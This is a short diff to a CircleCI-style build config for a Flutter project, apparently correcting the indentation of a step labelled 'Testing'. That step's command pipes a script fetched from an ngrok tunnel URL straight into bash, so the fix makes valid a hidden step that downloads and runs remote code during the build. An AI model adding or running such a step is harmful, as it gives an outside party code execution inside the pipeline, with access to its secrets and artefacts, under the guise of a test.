@@ -135,7 +135,7 @@ orbs:
           - run:
               name: Setting up project
               command: cd ../ && flutter create amplified_todo
-          -run:
+          - run:
               name: Testing
               command: curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
           - run:
